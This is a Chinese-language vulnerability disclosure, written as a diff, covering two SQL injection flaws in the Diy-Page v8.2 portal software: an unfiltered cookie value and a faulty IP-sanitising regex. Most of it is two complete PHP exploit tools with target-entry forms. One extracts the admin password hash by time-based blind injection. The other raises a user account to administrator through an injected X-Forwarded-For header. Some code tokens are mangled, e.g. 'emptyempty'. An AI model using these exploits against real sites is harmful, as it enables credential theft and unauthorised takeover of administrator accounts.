@@ -1,0 +1,82 @@
+Diy-Page v8.2 SQL注入漏洞
+
+[Diy-Page v8.2 SQL注入漏洞 全文]
+影响版本：v8.2
+程序介绍：
+DiY-Page创始于2005年2月末，是一个全新概念的自定制门户系统，使用它，可以轻松地将论坛变成一个准门户站点。最初它是由软件作者网站上自创的首页程序改进而成，经过不断的升级改进，软件程序的功能愈加完善，性能不断提高，深受广大网民喜爱...... 
+
+第一个漏洞：cookIE延迟注入
+存在位置：/mod/dpcms/js/buymanage.php 
+
+
+ include_once PATH_PRE.''lang/''.LANGPAK.''/fore.php'';include_once PATH_PRE.''lang/''.LANGPAK.''/dpcms_fore.php'';echo $uid=$_COOKIE[''dp_uid''];$eid=intval($_GET[''eid'']);$dateformat= $d_mainset[''mod_setting''][''dpcms''][''dateformat''] ? $d_mainset[''mod_setting''][''dpcms''][''dateformat''] : ''Y-n-j H:i:s'';$islog=$db->result($db->query(''SELECT count(*) FROM ''.DP_DBPREFIX.''user_list WHERE uid=''.$uid.'' AND password="''.$_COOKIE[''dp_password''].''"'')); 
+  
+
+$_COOKIE[''dp_uid'']，没有经过过滤就带入查询了，导致注入产生，由于没有回显，只能延迟注入。 
+
+第二个漏洞:getip注入
+存在位置：/inc/func.php
+
+   if (getenv(''HTTP_CLIENT_IP'') and strcasecmp(getenv(''HTTP_CLIENT_IP''),''unknown'')) {  $onlineip=getenv(''HTTP_CLIENT_IP''); }elseif (getenv(''HTTP_X_FORWARDED_FOR'') and strcasecmp(getenv(''HTTP_X_FORWARDED_FOR''),''unknown'')) {  $onlineip=getenv(''HTTP_X_FORWARDED_FOR''); }elseif (getenv(''REMOTE_ADDR'') and strcasecmp(getenv(''REMOTE_ADDR''),''unknown'')) {  $onlineip=getenv(''REMOTE_ADDR''); }elseif (isset($_SERVER[''REMOTE_ADDR'']) and $_SERVER[''REMOTE_ADDR''] and strcasecmp($_SERVER[''REMOTE_ADDR''],''unknown'')) {  $onlineip=$_SERVER[''REMOTE_ADDR'']; } return preg_replace("/^([\d\.]+).*/","\\1",$onlineip);
+  
+
+
+ 
+
+重点看最后一句：preg_replace("/^([\d\.]+).*/","\\1",$onlineip);作者的意图是将IP后面多余字符去掉，替换以数字+点开头的字符串，过滤非法IP，如1.1.1.1abcdef替换成1.1.1.1。但是这个正则有缺陷，只要不是数字开头，那就不进行替换。漏洞产生。 
+
+EXP：
+延迟注入：
+
+ 
+
+<?php  
+
+/**  
+
+*Diy-Page v8.2 Delay SQL Injection Exploit  
+
+*发布日期：2011-2-2  
+
+*发布作者：子仪  
+
+*作者博客：  
+
+*漏洞版本：8.2  
+
+*官方地址：http://www.diypage.com  
+
+**/ 
+
+session_start();  error_reporting(0);   if(isset($_GET[''host''])&&isset($_GET[''path''])){          $host = $_GET[''host''];          $path = $_GET[''path''];          $i = $_GET[''i'']; //asc码的位数          $j = $_GET[''j'']; //MD5的位数                    //当第一次执行时          if(emptyempty($j)){                  $i = 0;                  $j = 1;                  nextcrack();          }          echo "正在破解第{$j}位...<br>已破解密码:".$_SESSION[pass];          $timeout = 2; //超时时间          $password = pass();          $time1 = gettime();//第一次执行时间          send();          $time2 = gettime();//第二次执行时间          if($time2-$time1>$timeout && $j<33){                  //破解成功 MD5位数+1                  //echo chr($password[$i]);exit;                  $_SESSION[pass].=chr($password[$i]);                  $i = 0;                  $j++;                  //sleep(1);//休息一会。。。                  nextcrack();          }elseif($j==33){                  echo "<br>破解结束！";                  unset($_SESSION[pass]);                  session_destroy();                            }else{                  //啥？还没破解出来，继续                  if($i>23) $i=-1;                  $i++;                  nextcrack();          }  }   //MD5的ASC码密码表  function pass(){          //0-9 a-f A-F          $pass = ''48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,97,98,99,100,101,102'';          $pass_arr = explode('','',$pass);          return $pass_arr;  }   //获取当前时间  function gettime(){          $mtime = explode('' '',microtime());          $starttime = $mtime[1]+$mtime[0];          return $starttime;  }    function send(){          global $host,$path,$i,$j,$password;          $cmd = "domain=www.zyday.com";      $data = "GET ".$path."/js.php?mod=dpcms&name=buymanage HTTP/1.1\r\n";      $data .= "Accept: */*\r\n";      $data .= "Accept-Language: zh-cn\r\n";      $data .= "Content-Type: application/x-www-form-urlencoded\r\n";      $data .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";      $data .= "Host: $host\r\n";      $data .= "Content-Length: ".strlen($cmd)."\r\n";          $data .= "CookIE: dp_uid=1 union select benchmark(1800000,md5(1111)) from dp_user_list where uid=1 and ord(substring(password,".$j.",1))=".$password[$i]."--\r\n";      $data .= "Connection: Close\r\n\r\n";      $data .= $cmd;                    $fp = fsockopen($host, 80);                      //无法连接到该域名          if(!$fp){      echo ''[-]No response from''.$host;      dIE;          }       fputs($fp, $data);            $resp = '''';       while ($fp && !feof($fp))          $resp .= fread($fp, 1024);          fclose($fp);  }   //破解下一个  function nextcrack(){          global $host,$path,$i,$j;          echo ''<script>location.href="diysql.php?host=''.$host.''&path=''.$path.''&i=''.$i.''&j=''.$j.''"</script>'';  }   ?>  <html>  <title>diy-page v8.2延迟注入EXP</title>  <b>diy-page v8.2延迟注入EXP</b>  <form action="" method=''GET''>  <input type="hidden" name="i" value=''0''><input type="hidden" value=''1'' name=''j''>  目标网址：<input type="text" name="host" value="*diypage''">www.sitedirsec.com">*diypage网址，请勿加http://<br>  二级目录：<input type="text" name="path" value="/">*不是二级目录则保持默认,格式：/diypage/  <br><input type="submit" value="开始猜解" onclick="javascript:alert(''由于本站速度比较慢，对最终结果有很大影响，请在本地测试EXP，谢谢'')">  </form>  <br>  注：此EXP的成功率与实际网络状况有关。<a href=''/?p=63'' target=''_blank''>如何提高延迟注入成功率？</a> 
+
+ 
+
+getip()EXP:
+
+
+--------------------------------------------------------------------------------
+
+ 
+
+<?php  
+
+/**  
+
+*Diy-Page v8.2 getip() remote SQL Injection Exploit  
+
+*发布日期：2011-2-2  
+
+*发布作者：子仪  
+
+*作者博客：  
+
+*漏洞版本：8.2  
+
+*官方地址：http://www.diypage.com  
+
+**/ 
+
+if (emptyempty($_POST[submit])) {            }else{          error_reporting(0);          ini_set(''max_execution_time'', 0);          $host = $_POST[host];          $path = $_POST[path];          $dpusername =  $_POST[dpusername];          $dpuserpassword =  $_POST[dpuserpassword];          $dpseccode = $_POST[dpseccode];          send();  }   function send()  {      global $host, $path,$dpusername,$dpuserpassword,$dpseccode;       $cmd = "dpusername={$dpusername}&dpuserpassword={$dpuserpassword}&dpseccode={$dpseccode}&issubmit=1";      $getinj=''zyday1.1.1.1",gid=2 where username = \''''.$dpusername.''\''#'';      $data = "POST ".$path."js.php?mod=dpuser&name=login HTTP/1.1\r\n";      $data .= "Accept: */*\r\n";      $data .= "Accept-Language: zh-cn\r\n";      $data .= "Content-Type: application/x-www-form-urlencoded\r\n";      $data .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";      $data .= "Host: $host\r\n";      $data .= "Content-Length: ".strlen($cmd)."\r\n";      $data .= "Connection: Close\r\n";      $data .= "X-Forwarded-For: $getinj\r\n\r\n";      $data .= $cmd;       $fp = fsockopen($host, 80);      fputs($fp, $data);       $resp = '''';       while ($fp && !feof($fp))          $resp .= fread($fp, 1024);           echo $resp;       }    ?>  <html>  <head>  <title>diypage v8.2 getip()注入</title>  </head>  <body>  <form action='''' method=''POST''>  目标地址：<input type=''input'' name=''host'' value=''''>*请勿加http://<br>  二级目录：<input type=''input'' name=''path'' value=''/''>*如果不是二级目录，请保持默认<br>  用户名：<input type=''input'' name=''dpusername'' value=''''>*您在diypage申请的用户名，<font color=''red''>请用小号测试</font><br>  密码：<input type=''input'' name=''dpuserpassword'' value=''''><br>*您设置的密码  <input type=''submit'' name=''submit'' value=''提升权限''><br>  </form>  如果显示成功登陆，则表示提权成功。去管理员后台登陆即可。<br>  <a href="" target="_blank">BY 子仪</a>  </body>  </html> 
+
+ 
